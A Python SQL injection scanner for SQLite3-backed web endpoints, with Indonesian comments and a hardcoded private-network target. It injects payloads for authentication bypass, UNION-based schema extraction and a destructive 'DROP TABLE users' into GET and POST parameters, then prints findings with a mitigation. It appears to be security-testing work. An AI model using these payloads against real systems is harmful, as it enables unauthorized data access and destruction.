import requests
import logging
import json
import html
from urllib.parse import urljoin

logger = logging.getLogger(__name__)

class SQLInjectionScanner:
    def __init__(self, path, method, get_params, post_body):
        self.path = path
        self.method = method.lower()  # Ubah ke lowercase untuk konsistensi
        self.get_params = get_params or {}  # Pastikan tidak None
        self.post_body = post_body or {}  # Pastikan tidak None
        self.session = requests.Session()
        self.findings = []
        self.sqli_steps = []
        self.base_url = "http://192.168.18.9:8000"  # Asumsi base URL dari target Anda

    def scan(self):
        """Scan endpoint for SQL Injection vulnerabilities specific to SQLite3"""
        # Payload spesifik untuk SQLite3
        payloads = [
            "' OR 1=1 --",  # Bypass autentikasi
            "' UNION SELECT sqlite_version(), NULL --",  # Ekstrak versi SQLite
            "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --",  # Ekstrak schema
            "' AND sqlite_version() --",  # Error-based untuk SQLite
            "'; DROP TABLE users; --"  # Manipulasi struktur (dari kode asli)
        ]
        
        # Test GET parameters
        full_url = urljoin(self.base_url, self.path)
        for param in self.get_params:
            param_name = param['name']
            for payload in payloads:
                try:
                    if self.method == 'get':
                        url = f"{full_url}?{param_name}={payload}"
                        response = self.session.get(url, timeout=5)
                        response_text = response.text.lower()
                        # Deteksi SQLite3-specific atau error umum
                        if response.status_code == 200 and any(keyword in response_text for keyword in ["sqlite", "error", "version", "table"]):
                            self.sqli_steps.append(f'GET {url}')
                            logger.info(f"SQLi detected on GET {url} with payload: {payload}")
                except requests.RequestException as e:
                    logger.error(f"SQLi GET scan failed for {url}: {str(e)}")
                    continue
        
        # Test POST body
        if self.method == 'post' and self.post_body:
            for param_name in self.post_body.keys():
                for payload in payloads:
                    try:
                        data = {param_name: payload}
                        if param_name == 'username':
                            data['password'] = 'test'  # Konsistensi dengan kode asli
                        response = self.session.post(full_url, json=data, timeout=5)
                        response_text = response.text.lower()
                        # Deteksi SQLite3-specific atau error umum
                        if response.status_code == 200 and any(keyword in response_text for keyword in ["sqlite", "error", "version", "table"]):
                            self.sqli_steps.append(f'POST {full_url} with {json.dumps(data)}')
                            logger.info(f"SQLi detected on POST {full_url} with payload: {payload}")
                    except requests.RequestException as e:
                        logger.error(f"SQLi POST scan failed for {full_url}: {str(e)}")
                        continue

        # Tambahkan temuan jika ada langkah reproduksi
        if self.sqli_steps:
            finding = {
                'type': 'SQL Injection (SQLite3)',
                'severity': 'High',
                'description': 'The application is vulnerable to SQL Injection attacks on SQLite3, allowing an attacker to execute arbitrary SQL commands or extract database information.',
                'reproduce': '\n'.join(self.sqli_steps),
                'mitigation': 'Use parameterized queries or prepared statements and sanitize all user inputs.'
            }
            self.findings.append(finding)
            print(f"[VULN] {finding['type']} - Severity: {finding['severity']}")
            print(f"  Description: {finding['description']}")
            print(f"  Steps to Reproduce:\n{finding['reproduce']}")
            print(f"  Mitigation: {finding['mitigation']}\n")
            logger.info(f"Found: SQLi at {self.path}")

        return self.findings